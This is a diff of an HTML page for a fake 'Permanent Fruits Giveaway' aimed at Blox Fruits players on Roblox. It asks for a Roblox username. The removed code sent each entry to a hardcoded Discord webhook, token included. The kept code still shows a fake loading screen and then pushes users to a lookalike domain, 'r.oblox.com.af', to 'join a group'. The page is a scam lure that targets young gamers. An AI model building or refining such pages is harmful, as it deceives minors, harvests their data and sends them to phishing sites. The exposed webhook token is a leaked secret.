@@ -31,7 +31,6 @@
             width: 420px;
             border: 3px solid #444;
             box-shadow: 0px 0px 10px #00ffcc;
-            transition: transform 0.3s ease-in-out;
         }
 
         .title {
@@ -39,9 +38,13 @@
             margin-bottom: 8px;
             letter-spacing: 1px;
             text-shadow: 2px 2px 5px #00ffcc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
-        input, select, button {
+        input, button {
             width: 100%;
             padding: 12px;
             margin-top: 12px;
@@ -67,23 +70,6 @@
             box-shadow: 0px 0px 8px #00ffcc;
         }
 
-        .loading-container {
-            width: 100%;
-            height: 8px;
-            background: #111;
-            border-radius: 5px;
-            overflow: hidden;
-            margin-top: 10px;
-            display: none;
-        }
-
-        .loading-bar {
-            width: 0;
-            height: 100%;
-            background: #00ffcc;
-            transition: width 3s ease-in-out;
-        }
-
         .popup {
             position: fixed;
             top: 50%;
@@ -105,90 +91,141 @@
             opacity: 1;
             transform: translate(-50%, -50%) scale(1);
         }
+
+        .fruits-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .fruit-item {
+            background: #222;
+            padding: 10px;
+            border-radius: 6px;
+            border: 3px solid #00ffcc;
+            cursor: pointer;
+            transition: 0.3s;
+            width: 90px;
+            text-align: center;
+        }
+
+        .fruit-item:hover {
+            background: #505050;
+            transform: scale(1.1);
+        }
+
+        .selected-fruit {
+            margin-top: 10px;
+            font-size: 18px;
+            color: #00ffcc;
+        }
+
+        .loading-ui {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(20, 20, 20, 0.9);
+            padding: 20px;
+            border-radius: 8px;
+            text-align: center;
+            border: 3px solid #00ffcc;
+            box-shadow: 0px 0px 10px #00ffcc;
+        }
+
+        .message {
+            margin-top: 12px;
+            font-size: 16px;
+            font-weight: bold;
+            color: #ff4444;
+            display: none;
+        }
+
+        .success {
+            color: #00ffcc;
+        }
+
     </style>
 </head>
 <body>
 
     <div class="container">
-        <h1 class="title">🎁 Permanent Fruits Giveaway 🎁</h1>
+        <h1 class="title">
+            <a href="https://emoji.gg/emoji/54696-dragon-bloxfruits">
+                <img src="https://cdn3.emoji.gg/emojis/54696-dragon-bloxfruits.png" width="64px" height="64px" alt="Dragon_BloxFruits">
+            </a>
+            Permanent Fruits Giveaway
+            <a href="https://emoji.gg/emoji/54696-dragon-bloxfruits">
+                <img src="https://cdn3.emoji.gg/emojis/54696-dragon-bloxfruits.png" width="64px" height="64px" alt="Dragon_BloxFruits">
+            </a>
+        </h1>
         <p>Enter your Roblox username and select your fruit.</p>
 
         <input type="text" id="username" placeholder="Enter your Roblox username">
-        <select id="fruit">
-            <option value="" disabled selected>Choose a Permanent Fruit</option>
-            <option>Permanent Dragon</option>
-            <option>Permanent Leopard</option>
-            <option>Permanent Kitsune</option>
-            <option>Permanent Mammoth</option>
-            <option>Permanent T-Rex</option>
-            <option>Permanent Dough</option>
-            <option>Permanent Yeti</option>
-        </select>
+        
+        <button onclick="openFruitSelector()">Choose a Permanent Fruit</button>
+        <p class="selected-fruit" id="selectedFruit">No fruit selected</p>
 
-        <button id="enterBtn">Enter</button>
-        <div class="loading-container" id="loading">
-            <div class="loading-bar"></div>
+        <button onclick="enterGiveaway()">Enter</button>
+        
+        <div class="loading-ui" id="loadingUI">
+            <p>Processing your request...</p>
+            <img src="https://cdn3.emoji.gg/emojis/28213-tts-loading.gif" width="64px" height="64px" alt="Loading">
+        </div>
+
+        <p class="message" id="messageBox"></p>
+    </div>
+
+    <div class="popup" id="fruitPopup">
+        <p>Choose a Permanent Fruit:</p>
+        <div class="fruits-container">
+            <div class="fruit-item" onclick="selectFruit('Permanent Dragon')">🐉 Dragon</div>
+            <div class="fruit-item" onclick="selectFruit('Permanent Leopard')">🐆 Leopard</div>
+            <div class="fruit-item" onclick="selectFruit('Permanent Kitsune')">🦊 Kitsune</div>
+            <div class="fruit-item" onclick="selectFruit('Permanent Dough')">🍩 Dough</div>
         </div>
     </div>
 
-    <div class="popup" id="popup">
-        <p>⚠️ Complete Our Challenge to Claim ⚠️</p>
-        <p>Join Our Group: <span id="join-status">0/1</span></p>
+    <div class="popup" id="groupPopup">
+        <p>
+            <a href="https://emoji.gg/emoji/85951-rf-alert">
+                <img src="https://cdn3.emoji.gg/emojis/85951-rf-alert.gif" width="32px" height="32px" alt="rf_alert">
+            </a>
+            Join Our Group to Claim
+            <a href="https://emoji.gg/emoji/85951-rf-alert">
+                <img src="https://cdn3.emoji.gg/emojis/85951-rf-alert.gif" width="32px" height="32px" alt="rf_alert">
+            </a>
+        </p>
         <a href="https://www.r.oblox.com.af/communities/3189706619/BloxGain2" target="_blank">
             <button>Join Now</button>
         </a>
     </div>
 
     <script>
-        const webhookURL = "https://discord.com/api/webhooks/1306937739702308915/-kxWY0Xk3Ci95HR7DjHZyw2BcMSc3CvkwMwllTDEOve0LmozUU3QgGT8k51FtCCylQiI";
+        let selectedFruit = "";
 
-        document.getElementById("enterBtn").addEventListener("click", async function() {
-            let username = document.getElementById("username").value.trim();
-            let fruit = document.getElementById("fruit").value;
-            let loadingBar = document.querySelector(".loading-bar");
-            let loadingContainer = document.getElementById("loading");
-            let popup = document.getElementById("popup");
+        function openFruitSelector() {
+            document.getElementById("fruitPopup").classList.add("show");
+        }
 
-            if (!username || !fruit) {
-                alert("❌ Please enter your username and select a fruit!");
-                return;
-            }
+        function selectFruit(fruitName) {
+            selectedFruit = fruitName;
+            document.getElementById("selectedFruit").textContent = "Selected: " + fruitName;
+            document.getElementById("fruitPopup").classList.remove("show");
+        }
 
-            loadingContainer.style.display = "block";
-            loadingBar.style.width = "0%";
+        function enterGiveaway() {
+            document.getElementById("loadingUI").style.display = "block";
 
             setTimeout(() => {
-                loadingBar.style.width = "100%";
-            }, 100);
-
-            setTimeout(async () => {
-                loadingContainer.style.display = "none";
-                popup.classList.add("show");
-
-                let avatarURL = `https://www.rolimons.com/avatar/${username}`;
-
-                let embed = {
-                    "username": "Permanent Fruit Giveaway",
-                    "avatar_url": "https://static.wikia.nocookie.net/blox-fruits/images/8/8d/DragonFruitIcon.png",
-                    "embeds": [
-                        {
-                            "title": "🎁 New Giveaway Entry!",
-                            "description": `**Roblox User:** [${username}](https://pornhub.com)\n**Selected Fruit:** ${fruit}`,
-                            "color": 3066993,
-                            "thumbnail": { "url": avatarURL },
-                            "footer": { "text": "BloxFruits Giveaway Bot" }
-                        }
-                    ]
-                };
-
-                await fetch(webhookURL, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(embed)
-                });
-
+                document.getElementById("loadingUI").style.display = "none";
+                document.getElementById("groupPopup").classList.add("show");
             }, 3000);
-        });
+        }
     </script>
+
 </body>
 </html>
